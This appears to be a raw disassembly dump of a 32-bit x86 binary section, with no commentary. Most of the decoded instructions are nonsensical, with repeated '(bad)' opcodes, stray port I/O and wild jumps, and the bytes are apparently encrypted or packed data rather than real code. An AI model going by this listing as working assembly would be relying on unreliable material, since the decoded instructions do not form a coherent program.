  407bf3:	a0 a0 d5 a6 5f       	mov    0x5fa6d5a0,%al
  407bf8:	b5 10                	mov    $0x10,%ch
  407bfa:	56                   	push   %esi
  407bfb:	a0 a0 23 2d a0       	mov    0xa02d23a0,%al
  407c00:	a0 b3 f6 1b bc       	mov    0xbc1bf6b3,%al
  407c05:	04 e0                	add    $0xe0,%al
  407c07:	60                   	pusha
  407c08:	5e                   	pop    %esi
  407c09:	78 44                	js     0x407c4f
  407c0b:	a0 a0 4b be 48       	mov    0x48be4ba0,%al
  407c10:	35 5f 9f 5f c5       	xor    $0xc55f9f5f,%eax
  407c15:	5f                   	pop    %edi
  407c16:	a0 60 a0 93 72       	mov    0x7293a060,%al
  407c1b:	ea b3 19 a8 60 a0 60 	ljmp   $0x60a0,$0x60a819b3
  407c22:	cb                   	lret
  407c23:	2a 06                	sub    (%esi),%al
  407c25:	33 80 c6 a9 66 20    	xor    0x2066a9c6(%eax),%eax
  407c2b:	63 a8 e0 db 68 16    	arpl   %ebp,0x1668dbe0(%eax)
  407c31:	3d af 17 a6 21       	cmp    $0x21a617af,%eax
  407c36:	88 6f 06             	mov    %ch,0x6(%edi)
  407c39:	31 c6                	xor    %eax,%esi
  407c3b:	5e                   	pop    %esi
  407c3c:	ab                   	stos   %eax,%es:(%edi)
  407c3d:	be fb 23 30 b3       	mov    $0xb33023fb,%esi
  407c42:	f6 1b                	negb   (%ebx)
  407c44:	bc 04 e0 60 5e       	mov    $0x5e60e004,%esp
  407c49:	78 44                	js     0x407c8f
  407c4b:	a0 a0 4b be 48       	mov    0x48be4ba0,%al
  407c50:	f5                   	cmc
  407c51:	5f                   	pop    %edi
  407c52:	9f                   	lahf
  407c53:	5f                   	pop    %edi
  407c54:	c5 5f a0             	lds    -0x60(%edi),%ebx
  407c57:	60                   	pusha
  407c58:	a0 93 72 ea b3       	mov    0xb3ea7293,%al
  407c5d:	19 a8 60 a0 60 cb    	sbb    %ebp,-0x349f5fa0(%eax)
  407c63:	2a 06                	sub    (%esi),%al
  407c65:	33 80 c6 a9 66 20    	xor    0x2066a9c6(%eax),%eax
  407c6b:	63 a8 e0 db 68 16    	arpl   %ebp,0x1668dbe0(%eax)
  407c71:	3d 06 eb a6 c6       	cmp    $0xc6a6eb06,%eax
  407c76:	61                   	popa
  407c77:	48                   	dec    %eax
  407c78:	a8 c6                	test   $0xc6,%al
  407c7a:	61                   	popa
  407c7b:	86 a8 e0 cb 68 fe    	xchg   %ch,-0x1973420(%eax)
  407c81:	bb 63 eb 60 b3       	mov    $0xb360eb63,%ebx
  407c86:	f6 b7 d3 20 5a 78    	divb   0x785a20d3(%edi)
  407c8c:	b7 a1                	mov    $0xa1,%bh
  407c8e:	a0 19 fc 83 e1       	mov    0xe183fc19,%al
  407c93:	60                   	pusha
  407c94:	5b                   	pop    %ebx
  407c95:	46                   	inc    %esi
  407c96:	c0 a1 a0 c6 67 62 a1 	shlb   $0xa1,0x6267c6a0(%ecx)
  407c9d:	60                   	pusha
  407c9e:	2d 10 13 62 a0       	sub    $0xa0621310,%eax
  407ca3:	60                   	pusha
  407ca4:	06                   	push   %es
  407ca5:	e9 d1 c6 29 63       	jmp    0x636a437b
  407caa:	e0 e3                	loopne 0x407c8f
  407cac:	63 62 23             	arpl   %esp,0x23(%edx)
  407caf:	21 a2 e3 62 62 06    	and    %esp,0x66262e3(%edx)
  407cb5:	9d                   	popf
  407cb6:	da 61 15             	fisubl 0x15(%ecx)
  407cb9:	3f                   	aas
  407cba:	d3 20                	shll   %cl,(%eax)
  407cbc:	06                   	push   %es
  407cbd:	1a da                	sbb    %dl,%bl
  407cbf:	61                   	popa
  407cc0:	af                   	scas   %es:(%edi),%eax
  407cc1:	17                   	pop    %ss
  407cc2:	78 c6                	js     0x407c8a
  407cc4:	2b 9c fd 78 b7 a1 a0 	sub    -0x5f5e4888(%ebp,%edi,8),%ebx
  407ccb:	6f                   	outsl  %ds:(%esi),(%dx)
  407ccc:	57                   	push   %edi
  407ccd:	50                   	push   %eax
  407cce:	06                   	push   %es
  407ccf:	63 dc                	arpl   %ebx,%esp
  407cd1:	d5 ba                	aad    $0xba
  407cd3:	77 e1                	ja     0x407cb6
  407cd5:	60                   	pusha
  407cd6:	af                   	scas   %es:(%edi),%eax
  407cd7:	17                   	pop    %ss
  407cd8:	6a c6                	push   $0xffffffc6
  407cda:	29 9c ed 78 b7 a1 a0 	sub    %ebx,-0x5f5e4888(%ebp,%ebp,8)
  407ce1:	c6                   	(bad)
  407ce2:	29 64 ed bc          	sub    %esp,-0x44(%ebp,%ebp,8)
  407ce6:	c3                   	ret
  407ce7:	a1 a0 c6 29 74       	mov    0x7429c6a0,%eax
  407cec:	fd                   	std
  407ced:	60                   	pusha
  407cee:	bc a1 a0 c6 29       	mov    $0x29c6a0a1,%esp
  407cf3:	74 15                	je     0x407d0a
  407cf5:	62 bc a1 a0 c6 23 20 	bound  %edi,0x2023c6a0(%ecx,%eiz,4)
  407cfc:	a2 a2 06 e1 9a       	mov    %al,0x9ae106a2
  407d01:	d2 a2 d6 5b c6 67    	shlb   %cl,0x67c65bd6(%edx)
  407d07:	65 9e                	gs sahf
  407d09:	7b e1                	jnp    0x407cec
  407d0b:	60                   	pusha
  407d0c:	9f                   	lahf
  407d0d:	5f                   	pop    %edi
  407d0e:	06                   	push   %es
  407d0f:	27                   	daa
  407d10:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407d11:	44                   	inc    %esp
  407d12:	c0 a1 a0 60 a0 bf fe 	shlb   $0xfe,-0x405f9f60(%ecx)
  407d19:	bb 63 eb 60 b3       	mov    $0xb360eb63,%ebx
  407d1e:	f6 b7 f5 b1 d3 5f    	divb   0x5fd3b1f5(%edi)
  407d24:	06                   	push   %es
  407d25:	1e                   	push   %ds
  407d26:	13 62 58             	adc    0x58(%edx),%esp
  407d29:	bc c3 a1 a0 1a       	mov    $0x1aa0a1c3,%esp
  407d2e:	b8 77 e1 60 06       	mov    $0x660e177,%eax
  407d33:	eb a8                	jmp    0x407cdd
  407d35:	c6                   	(bad)
  407d36:	21 59 13             	and    %ebx,0x13(%ecx)
  407d39:	62 12                	bound  %edx,(%edx)
  407d3b:	7d af                	jge    0x407cec
  407d3d:	17                   	pop    %ss
  407d3e:	ba a3 71 4b af       	mov    $0xaf4b71a3,%edx
  407d43:	17                   	pop    %ss
  407d44:	8f c6                	pop    %esi
  407d46:	29 7c 0d 78          	sub    %edi,0x78(%ebp,%ecx,1)
  407d4a:	b7 a1                	mov    $0xa1,%bh
  407d4c:	a0 6f 57 3f 06       	mov    0x63f576f,%al
  407d51:	e9 ac bd fc 83       	jmp    0x843d3b02
  407d56:	e1 60                	loope  0x407db8
  407d58:	e7 e3                	out    %eax,$0xe3
  407d5a:	62 62 23             	bound  %esp,0x23(%edx)
  407d5d:	20 a2 c6 9f 2e 15    	and    %ah,0x152e9fc6(%edx)
  407d63:	2e d3 56 06          	rcll   %cl,%cs:0x6(%esi)
  407d67:	1f                   	pop    %ds
  407d68:	da 61 2d             	fisubl 0x2d(%ecx)
  407d6b:	be a1 6f 57 26       	mov    $0x26576fa1,%esi
  407d70:	06                   	push   %es
  407d71:	eb cc                	jmp    0x407d3f
  407d73:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407d74:	b8 77 e1 60 af       	mov    $0xaf60e177,%eax
  407d79:	17                   	pop    %ss
  407d7a:	63 c6                	arpl   %eax,%esi
  407d7c:	a3 8c e5 78 b7       	mov    %eax,0xb778e58c
  407d81:	a1 a0 6f 57 27       	mov    0x27576fa0,%eax
  407d86:	06                   	push   %es
  407d87:	e9 cc a5 b8 77       	jmp    0x77f92358
  407d8c:	e1 60                	loope  0x407dee
  407d8e:	2b 3f                	sub    (%edi),%edi
  407d90:	eb 4b                	jmp    0x407ddd
  407d92:	a1 ab af 17 63       	mov    0x6317afab,%eax
  407d97:	c6                   	(bad)
  407d98:	db 8c e5 78 b7 a1 a0 	fisttpl -0x5f5e4888(%ebp,%eiz,8)
  407d9f:	d2 92 a3 2b 27 06    	rclb   %cl,0x6272ba3(%edx)
  407da5:	8b 63 63             	mov    0x63(%ebx),%esp
  407da8:	60                   	pusha
  407da9:	c6                   	(bad)
  407daa:	29 64 c4 6f          	sub    %esp,0x6f(%esp,%eax,8)
  407dae:	57                   	push   %edi
  407daf:	6c                   	insb   (%dx),%es:(%edi)
  407db0:	c4 6f 57             	les    0x57(%edi),%ebp
  407db3:	23 2d 74 e5 7a b7    	and    0xb77ae574,%ebp
  407db9:	a1 a0 6f 57 23       	mov    0x23576fa0,%eax
  407dbe:	2d 64 e5 78 b7       	sub    $0xb778e564,%eax
  407dc3:	a1 a0 48 6b 09       	mov    0x96b48a0,%eax
  407dc8:	9f                   	lahf
  407dc9:	5f                   	pop    %edi
  407dca:	af                   	scas   %es:(%edi),%eax
  407dcb:	17                   	pop    %ss
  407dcc:	63 c6                	arpl   %eax,%esi
  407dce:	29 8c e5 78 b7 a1 a0 	sub    %ecx,-0x5f5e4888(%ebp,%eiz,8)
  407dd5:	6f                   	outsl  %ds:(%esi),(%dx)
  407dd6:	57                   	push   %edi
  407dd7:	6c                   	insb   (%dx),%es:(%edi)
  407dd8:	c4 6f 57             	les    0x57(%edi),%ebp
  407ddb:	23 2d 74 e5 be c3    	and    0xc3bee574,%ebp
  407de1:	a1 a0 6f 57 23       	mov    0x23576fa0,%eax
  407de6:	2d 64 e5 bc c3       	sub    $0xc3bce564,%eax
  407deb:	a1 a0 48 43 09       	mov    0x94348a0,%eax
  407df0:	9f                   	lahf
  407df1:	5f                   	pop    %edi
  407df2:	af                   	scas   %es:(%edi),%eax
  407df3:	17                   	pop    %ss
  407df4:	63 c6                	arpl   %eax,%esi
  407df6:	29 94 e5 bc c3 a1 a0 	sub    %edx,-0x5f5e3c44(%ebp,%eiz,8)
  407dfd:	c6                   	(bad)
  407dfe:	23 26                	and    (%esi),%esp
  407e00:	a2 a7 06 e1 9f       	mov    %al,0x9fe106a7
  407e05:	d3 a2 6f 22 bd 9f    	shll   %cl,-0x6042dd91(%edx)
  407e0b:	5f                   	pop    %edi
  407e0c:	9f                   	lahf
  407e0d:	93                   	xchg   %eax,%ebx
  407e0e:	96                   	xchg   %eax,%esi
  407e0f:	18 fc                	sbb    %bh,%ah
  407e11:	83 e1 60             	and    $0x60,%ecx
  407e14:	06                   	push   %es
  407e15:	eb b8                	jmp    0x407dcf
  407e17:	6f                   	outsl  %ds:(%esi),(%dx)
  407e18:	57                   	push   %edi
  407e19:	33 06                	xor    (%esi),%eax
  407e1b:	e9 d4 b5 a0 7c       	jmp    0x7ce133f4
  407e20:	e1 60                	loope  0x407e82
  407e22:	06                   	push   %es
  407e23:	e1 9b                	loope  0x407dc0
  407e25:	d3 a2 d3 ab 6f 57    	shll   %cl,0x576fabd3(%edx)
  407e2b:	33 06                	xor    (%esi),%eax
  407e2d:	e9 d4 b5 a2 7c       	jmp    0x7ce33406
  407e32:	e1 60                	loope  0x407e94
  407e34:	e6 e3                	out    %al,$0xe3
  407e36:	60                   	pusha
  407e37:	62 06                	bound  %eax,(%esi)
  407e39:	e1 9e                	loope  0x407dd9
  407e3b:	d3 a2 d5 75 ba fd    	shll   %cl,-0x2458a2b(%edx)
  407e41:	bf fe bb 63 b3       	mov    $0xb363bbfe,%edi
  407e46:	f6 b7 2b 38 5e 78    	divb   0x785e382b(%edi)
  407e4c:	b7 a1                	mov    $0xa1,%bh
  407e4e:	a0 c6 21 1e 84       	mov    0x841e21c6,%al
  407e53:	64 a0 60 a0 e0 15    	mov    %fs:0x15e0a060,%al
  407e59:	65 88 1e             	mov    %bl,%gs:(%esi)
  407e5c:	9e                   	sahf
  407e5d:	5f                   	pop    %edi
  407e5e:	9f                   	lahf
  407e5f:	6f                   	outsl  %ds:(%esi),(%dx)
  407e60:	57                   	push   %edi
  407e61:	23 06                	and    (%esi),%eax
  407e63:	eb bc                	jmp    0x407e21
  407e65:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407e66:	86 80 e1 60 af 17    	xchg   %al,0x17af60e1(%eax)
  407e6c:	63 c6                	arpl   %eax,%esi
  407e6e:	9f                   	lahf
  407e6f:	64 e6 c6             	fs out %al,$0xc6
  407e72:	2b 74 e6 ed          	sub    -0x13(%esi,%eiz,8),%esi
  407e76:	e3 61                	jecxz  0x407ed9
  407e78:	af                   	scas   %es:(%edi),%eax
  407e79:	17                   	pop    %ss
  407e7a:	68 c6 db 74 ee       	push   $0xee74dbc6
  407e7f:	6f                   	outsl  %ds:(%esi),(%dx)
  407e80:	26 ea a0 60 a0 4b a1 	es ljmp $0xa0a1,$0x4ba060a0
  407e87:	a0 
  407e88:	af                   	scas   %es:(%edi),%eax
  407e89:	17                   	pop    %ss
  407e8a:	68 c6 db b4 ee       	push   $0xeeb4dbc6
  407e8f:	62 17                	bound  %edx,(%edi)
  407e91:	55                   	push   %ebp
  407e92:	af                   	scas   %es:(%edi),%eax
  407e93:	17                   	pop    %ss
  407e94:	68 c6 2b 6c ee       	push   $0xee6c2bc6
  407e99:	6f                   	outsl  %ds:(%esi),(%dx)
  407e9a:	57                   	push   %edi
  407e9b:	5b                   	pop    %ebx
  407e9c:	06                   	push   %es
  407e9d:	e9 ac de af 17       	jmp    0x17f05d4e
  407ea2:	68 c6 29 74 ee       	push   $0xee7429c6
  407ea7:	6f                   	outsl  %ds:(%esi),(%dx)
  407ea8:	57                   	push   %edi
  407ea9:	33 06                	xor    (%esi),%eax
  407eab:	eb b4                	jmp    0x407e61
  407ead:	b5 fc                	mov    $0xfc,%ch
  407eaf:	83 e1 60             	and    $0x60,%ecx
  407eb2:	af                   	scas   %es:(%edi),%eax
  407eb3:	17                   	pop    %ss
  407eb4:	6a c6                	push   $0xffffffc6
  407eb6:	29 64 ed 60          	sub    %esp,0x60(%ebp,%ebp,8)
  407eba:	bc a1 a0 c6 21       	mov    $0x21c6a0a1,%esp
  407ebf:	5a                   	pop    %edx
  407ec0:	13 62 13             	adc    0x13(%edx),%esp
  407ec3:	6b af 17 6a c6 29 64 	imul   $0x64,0x29c66a17(%edi),%ebp
  407eca:	ed                   	in     (%dx),%eax
  407ecb:	62 bc a1 a0 6f 57 28 	bound  %edi,0x28576fa0(%ecx,%eiz,4)
  407ed2:	06                   	push   %es
  407ed3:	eb ac                	jmp    0x407e81
  407ed5:	ad                   	lods   %ds:(%esi),%eax
  407ed6:	fc                   	cld
  407ed7:	83 e1 60             	and    $0x60,%ecx
  407eda:	af                   	scas   %es:(%edi),%eax
  407edb:	17                   	pop    %ss
  407edc:	98                   	cwtl
  407edd:	c6                   	(bad)
  407ede:	29 74 1d bc          	sub    %esi,-0x44(%ebp,%ebx,1)
  407ee2:	c3                   	ret
  407ee3:	a1 a0 6f 57 31       	mov    0x31576fa0,%eax
  407ee8:	06                   	push   %es
  407ee9:	e9 bc b5 a0 7c       	jmp    0x7ce134aa
  407eee:	e1 60                	loope  0x407f50
  407ef0:	06                   	push   %es
  407ef1:	e1 99                	loope  0x407e8c
  407ef3:	d3 a2 d3 ab 6f 57    	shll   %cl,0x576fabd3(%edx)
  407ef9:	31 06                	xor    %eax,(%esi)
  407efb:	e9 bc b5 a2 7c       	jmp    0x7ce334bc
  407f00:	e1 60                	loope  0x407f62
  407f02:	af                   	scas   %es:(%edi),%eax
  407f03:	17                   	pop    %ss
  407f04:	73 c6                	jae    0x407ecc
  407f06:	29 6c f5 bc          	sub    %ebp,-0x44(%ebp,%esi,8)
  407f0a:	c3                   	ret
  407f0b:	a1 a0 eb 78 6f       	mov    0x6f78eba0,%eax
  407f10:	57                   	push   %edi
  407f11:	23 06                	and    (%esi),%eax
  407f13:	eb bc                	jmp    0x407ed1
  407f15:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407f16:	a0 7c e1 60 06       	mov    0x660e17c,%al
  407f1b:	e5 7b                	in     $0x7b,%eax
  407f1d:	6f                   	outsl  %ds:(%esi),(%dx)
  407f1e:	25 a7 9f 5f 9f       	and    $0x9f5f9fa7,%eax
  407f23:	bf fe bb 63 eb       	mov    $0xeb63bbfe,%edi
  407f28:	60                   	pusha
  407f29:	b3 06                	mov    $0x6,%bl
  407f2b:	eb bd                	jmp    0x407eea
  407f2d:	a0 c8 a1 a0 c6       	mov    0xc6a0a1c8,%al
  407f32:	21 5b 13             	and    %ebx,0x13(%ebx)
  407f35:	62 13                	bound  %edx,(%ebx)
  407f37:	7e 88                	jle    0x407ec1
  407f39:	24 9c                	and    $0x9c,%al
  407f3b:	5f                   	pop    %edi
  407f3c:	9f                   	lahf
  407f3d:	85 9f 60 a0 60 af    	test   %ebx,-0x509f5fa0(%edi)
  407f43:	17                   	pop    %ss
  407f44:	73 63                	jae    0x407fa9
  407f46:	62 c6 2b             	(bad) {rz-bad},{%k4}
  407f49:	7c e5                	jl     0x407f30
  407f4b:	bc c3 a1 a0 c6       	mov    $0xc6a0a1c3,%esp
  407f50:	21 5b 13             	and    %ebx,0x13(%ebx)
  407f53:	62 12                	bound  %edx,(%edx)
  407f55:	42                   	inc    %edx
  407f56:	06                   	push   %es
  407f57:	e1 8b                	loope  0x407ee4
  407f59:	d3 a2 eb 63 48 83    	shll   %cl,-0x7cb79c15(%edx)
  407f5f:	5e                   	pop    %esi
  407f60:	9f                   	lahf
  407f61:	5f                   	pop    %edi
  407f62:	2b 23                	sub    (%ebx),%esp
  407f64:	fb                   	sti
  407f65:	23 2d a0 a0 b3 f6    	and    0xf6b3a0a0,%ebp
  407f6b:	b7 88                	mov    $0x88,%bh
  407f6d:	30 9c 5f 9f 93 7b ea 	xor    %bl,-0x15846c61(%edi,%ebx,2)
  407f74:	78 6f                	js     0x407fe5
  407f76:	57                   	push   %edi
  407f77:	23 af 16 58 70 42    	and    0x42705816(%edi),%ebp
  407f7d:	a0 a0 21 87 66       	mov    0x668721a0,%al
  407f82:	af                   	scas   %es:(%edi),%eax
  407f83:	16                   	push   %ss
  407f84:	50                   	push   %eax
  407f85:	70 43                	jo     0x407fca
  407f87:	a0 a0 c6 23 4e       	mov    0x4e23c6a0,%al
  407f8c:	a2 c6 25 56 16       	mov    %al,0x165625c6
  407f91:	77 ee                	ja     0x407f81
  407f93:	48                   	dec    %eax
  407f94:	09 5c 9f 5f          	or     %ebx,0x5f(%edi,%ebx,4)
  407f98:	c5 5f a0             	lds    -0x60(%edi),%ebx
  407f9b:	60                   	pusha
  407f9c:	a0 63 7b c6 ab       	mov    0xabc67b63,%al
  407fa1:	23 2b                	and    (%ebx),%ebp
  407fa3:	38 06                	cmp    %al,(%esi)
  407fa5:	e5 96                	in     $0x96,%eax
  407fa7:	d7                   	xlat   %ds:(%ebx)
  407fa8:	89 eb                	mov    %ebp,%ebx
  407faa:	63 c6                	arpl   %eax,%esi
  407fac:	23 40 df             	and    -0x21(%eax),%eax
  407faf:	c6                   	(bad)
  407fb0:	ab                   	stos   %eax,%es:(%edi)
  407fb1:	27                   	daa
  407fb2:	ff                   	(bad)
  407fb3:	be fb 23 2d a0       	mov    $0xa02d23fb,%esi
  407fb8:	a0 b3 f6 b7 f5       	mov    0xf5b7f6b3,%al
  407fbd:	e3 64                	jecxz  0x408023
  407fbf:	58                   	pop    %eax
  407fc0:	88 44 9b 5f          	mov    %al,0x5f(%ebx,%ebx,4)
  407fc4:	9f                   	lahf
  407fc5:	02 c8                	add    %al,%cl
  407fc7:	04 e0                	add    $0xe0,%al
  407fc9:	60                   	pusha
  407fca:	88 3a                	mov    %bh,(%edx)
  407fcc:	9b                   	fwait
  407fcd:	5f                   	pop    %edi
  407fce:	9f                   	lahf
  407fcf:	02 c9                	add    %cl,%cl
  407fd1:	04 e0                	add    $0xe0,%al
  407fd3:	60                   	pusha
  407fd4:	88 30                	mov    %dh,(%eax)
  407fd6:	9b                   	fwait
  407fd7:	5f                   	pop    %edi
  407fd8:	9f                   	lahf
  407fd9:	02 ca                	add    %dl,%cl
  407fdb:	04 e0                	add    $0xe0,%al
  407fdd:	60                   	pusha
  407fde:	88 26                	mov    %ah,(%esi)
  407fe0:	9b                   	fwait
  407fe1:	5f                   	pop    %edi
  407fe2:	9f                   	lahf
  407fe3:	02 cb                	add    %bl,%cl
  407fe5:	04 e0                	add    $0xe0,%al
  407fe7:	60                   	pusha
  407fe8:	23 9d c8 04 e0 60    	and    0x60e004c8(%ebp),%ebx
  407fee:	a0 6f 24 1e a0       	mov    0xa01e246f,%al
  407ff3:	60                   	pusha
  407ff4:	a0 48 2b 5c 9f       	mov    0x9f5c2b48,%al
  407ff9:	5f                   	pop    %edi
  407ffa:	58                   	pop    %eax
  407ffb:	3c a6                	cmp    $0xa6,%al
  407ffd:	a1 a0 11 c0 1a       	mov    0x1ac011a0,%eax
  408002:	64 6f                	outsl  %fs:(%esi),(%dx)
  408004:	a0 60 88 da 4e       	mov    0x4eda8860,%al
  408009:	5f                   	pop    %edi
  40800a:	9f                   	lahf
  40800b:	c6                   	(bad)
  40800c:	5e                   	pop    %esi
  40800d:	24 af                	and    $0xaf,%al
  40800f:	93                   	xchg   %eax,%ebx
  408010:	60                   	pusha
  408011:	e9 e4 84 a4 49       	jmp    0x49e504fa
  408016:	29 60 a0             	sub    %esp,-0x60(%eax)
  408019:	60                   	pusha
  40801a:	88 6a 9f             	mov    %ch,-0x61(%edx)
  40801d:	5f                   	pop    %edi
  40801e:	9f                   	lahf
  40801f:	eb 78                	jmp    0x408099
  408021:	c6                   	(bad)
  408022:	21 5b a0             	and    %ebx,-0x60(%ebx)
  408025:	61                   	popa
  408026:	13 7c 2b 23          	adc    0x23(%ebx,%ebp,1),%edi
  40802a:	88 06                	mov    %al,(%esi)
  40802c:	9b                   	fwait
  40802d:	5f                   	pop    %edi
  40802e:	9f                   	lahf
  40802f:	6f                   	outsl  %ds:(%esi),(%dx)
  408030:	57                   	push   %edi
  408031:	26 28 f8             	es sub %bh,%al
  408034:	7c 66                	jl     0x40809c
  408036:	e1 60                	loope  0x408098
  408038:	e6 c6                	out    %al,$0xc6
  40803a:	21 46 9f             	and    %eax,-0x61(%esi)
  40803d:	6f                   	outsl  %ds:(%esi),(%dx)
  40803e:	9f                   	lahf
  40803f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  408040:	c4 64 8b bf          	les    -0x41(%ebx,%ecx,4),%esp
  408044:	88 80 9f 5f 9f eb    	mov    %al,-0x1460a061(%eax)
  40804a:	76 c6                	jbe    0x408012
  40804c:	cb                   	lret
  40804d:	30 ea                	xor    %ch,%dl
  40804f:	c6                   	(bad)
  408050:	21 42 9f             	and    %eax,-0x61(%edx)
  408053:	6f                   	outsl  %ds:(%esi),(%dx)
  408054:	06                   	push   %es
  408055:	e9 b4 84 2b 23       	jmp    0x236c050e
  40805a:	06                   	push   %es
  40805b:	8d 9f 60 06 e3 60    	lea    0x60e30660(%edi),%ebx
  408061:	62 2b                	bound  %ebp,(%ebx)
  408063:	58                   	pop    %eax
  408064:	ef                   	out    %eax,(%dx)
  408065:	c6                   	(bad)
  408066:	25 5f 12 99 e7       	and    $0xe799125f,%eax
  40806b:	93                   	xchg   %eax,%ebx
  40806c:	8d 6f 57             	lea    0x57(%edi),%ebp
  40806f:	64 c4 6f 57          	les    %fs:0x57(%edi),%ebp
  408073:	35 a3 22 c5 5f       	xor    $0x5fc522a3,%eax
  408078:	af                   	scas   %es:(%edi),%eax
  408079:	60                   	pusha
  40807a:	a0 93 7b ea 38       	mov    0x38ea7b93,%al
  40807f:	3c a6                	cmp    $0xa6,%al
  408081:	a1 a0 eb 63 48       	mov    0x4863eba0,%eax
  408086:	eb 5b                	jmp    0x4080e3
  408088:	9f                   	lahf
  408089:	5f                   	pop    %edi
  40808a:	af                   	scas   %es:(%edi),%eax
  40808b:	17                   	pop    %ss
  40808c:	66 e8 38 3c          	callw  0xbcc8
  408090:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  408091:	a1 a0 a6 06 e1       	mov    0xe106a6a0,%eax
  408096:	86 5f af             	xchg   %bl,-0x51(%edi)
  408099:	5f                   	pop    %edi
  40809a:	e4 84                	in     $0x84,%al
  40809c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40809d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40809e:	06                   	push   %es
  40809f:	5f                   	pop    %edi
  4080a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4080a1:	d5 6a                	aad    $0x6a
  4080a3:	eb e4                	jmp    0x408089
  4080a5:	84 a4 9b a5 88 44 a0 	test   %ah,-0x5fbb775b(%ebx,%ebx,4)
  4080ac:	a0 6f 2c c7 9f       	mov    0x9fc72c6f,%al
  4080b1:	5f                   	pop    %edi
  4080b2:	9f                   	lahf
  4080b3:	b9 fa bd ff be       	mov    $0xbeffbdfa,%ecx
  4080b8:	fb                   	sti
  4080b9:	23 2d a0 a0 93 60    	and    0x6093a0a0,%ebp
  4080bf:	03 60 16             	add    0x16(%eax),%esp
  4080c2:	e0 60                	loopne 0x408124
  4080c4:	41                   	inc    %ecx
  4080c5:	30 a6 a1 a0 eb a0    	xor    %ah,-0x5f145f5f(%esi)
  4080cb:	48                   	dec    %eax
  4080cc:	c9                   	leave
  4080cd:	1a 9f 5f cb 65 b0    	sbb    -0x4f9a34a1(%edi),%bl
  4080d3:	04 e0                	add    $0xe0,%al
  4080d5:	60                   	pusha
  4080d6:	e0 9d                	loopne 0x408075
  4080d8:	a0 88 a0 60 1c       	mov    0x1c60a088,%al
  4080dd:	99                   	cltd
  4080de:	41                   	inc    %ecx
  4080df:	30 a6 a1 a0 48 fd    	xor    %ah,-0x2b75f5f(%esi)
  4080e5:	1c 9f                	sbb    $0x9f,%al
  4080e7:	5f                   	pop    %edi
  4080e8:	2b 75 b0             	sub    -0x50(%ebp),%esi
  4080eb:	04 e0                	add    $0xe0,%al
  4080ed:	60                   	pusha
  4080ee:	2d a4 b0 5f 2b       	sub    $0x2b5fb0a4,%eax
  4080f3:	75 58                	jne    0x40814d
  4080f5:	16                   	push   %ss
  4080f6:	e0 60                	loopne 0x408158
  4080f8:	59                   	pop    %ecx
  4080f9:	60                   	pusha
  4080fa:	c8 60 a0 48          	enter  $0xa060,$0x48
  4080fe:	33 06                	xor    (%esi),%eax
  408100:	9f                   	lahf
  408101:	5f                   	pop    %edi
  408102:	67 65 64 16          	addr16 gs fs push %ss
  408106:	e0 60                	loopne 0x408168
  408108:	a0 88 a0 60 21       	mov    0x2160a088,%al
  40810d:	65 b0 04             	gs mov $0x4,%al
  408110:	e0 60                	loopne 0x408172
  408112:	a0 88 a0 60 63       	mov    0x6360a088,%al
  408117:	01 70 66             	add    %esi,0x66(%eax)
  40811a:	e1 60                	loope  0x40817c
  40811c:	88 84 5c 5f 9f eb b5 	mov    %al,-0x4a1460a1(%esp,%ebx,2)
  408123:	70 44                	jo     0x408169
  408125:	a0 a0 ed e4 70       	mov    0x70e4eda0,%al
  40812a:	9f                   	lahf
  40812b:	b0 41                	mov    $0x41,%al
  40812d:	30 a6 a1 a0 eb a0    	xor    %ah,-0x5f145f5f(%esi)
  408133:	48                   	dec    %eax
  408134:	61                   	popa
  408135:	19 9f 5f 2b 28 cb    	sbb    %ebx,-0x34d7d4a1(%edi)
  40813b:	6d                   	insl   (%dx),%es:(%edi)
  40813c:	b0 04                	mov    $0x4,%al
  40813e:	e0 60                	loopne 0x4081a0
  408140:	e1 eb                	loope  0x40812d
  408142:	b5 18                	mov    $0x18,%ch
  408144:	56                   	push   %esi
  408145:	a0 a0 b8 88 a8       	mov    0xa888b8a0,%al
  40814a:	46                   	inc    %esi
  40814b:	5f                   	pop    %edi
  40814c:	9f                   	lahf
  40814d:	01 70 66             	add    %esi,0x66(%eax)
  408150:	e1 60                	loope  0x4081b2
  408152:	2b 60 88             	sub    -0x78(%eax),%esp
  408155:	00 59 5f             	add    %bl,0x5f(%ecx)
  408158:	9f                   	lahf
  408159:	8b a5 70 44 a0 a0    	mov    -0x5f5fbb90(%ebp),%esp
  40815f:	a0 43 24 56 a0       	mov    0xa0562443,%al
  408164:	a0 01 70 66 e1       	mov    0xe1667001,%al
  408169:	60                   	pusha
  40816a:	2b 60 88             	sub    -0x78(%eax),%esp
  40816d:	e8 59 5f 9f 8b       	call   0x8bdfe0cb
  408172:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408173:	70 44                	jo     0x4081b9
  408175:	a0 a0 a0 a1 65       	mov    0x65a1a0a0,%al
  40817a:	b0 04                	mov    $0x4,%al
  40817c:	e0 60                	loopne 0x4081de
  40817e:	63 eb                	arpl   %ebp,%ebx
  408180:	60                   	pusha
  408181:	01 74 66 e1          	add    %esi,-0x1f(%esi,%eiz,2)
  408185:	60                   	pusha
  408186:	2b 60 88             	sub    -0x78(%eax),%esp
  408189:	cc                   	int3
  40818a:	59                   	pop    %ecx
  40818b:	5f                   	pop    %edi
  40818c:	9f                   	lahf
  40818d:	eb 70                	jmp    0x4081ff
  40818f:	63 b5 28 56 a0 a0    	arpl   %esi,-0x5f5fa9d8(%ebp)
  408195:	01 74 66 e1          	add    %esi,-0x1f(%esi,%eiz,2)
  408199:	60                   	pusha
  40819a:	88 de                	mov    %bl,%dh
  40819c:	5c                   	pop    %esp
  40819d:	5f                   	pop    %edi
  40819e:	9f                   	lahf
  40819f:	01 74 66 e1          	add    %esi,-0x1f(%esi,%eiz,2)
  4081a3:	60                   	pusha
  4081a4:	88 fc                	mov    %bh,%ah
  4081a6:	5b                   	pop    %ebx
  4081a7:	5f                   	pop    %edi
  4081a8:	9f                   	lahf
  4081a9:	eb b5                	jmp    0x408160
  4081ab:	74 44                	je     0x4081f1
  4081ad:	a0 a0 ed f4 70       	mov    0x70f4eda0,%al
  4081b2:	9f                   	lahf
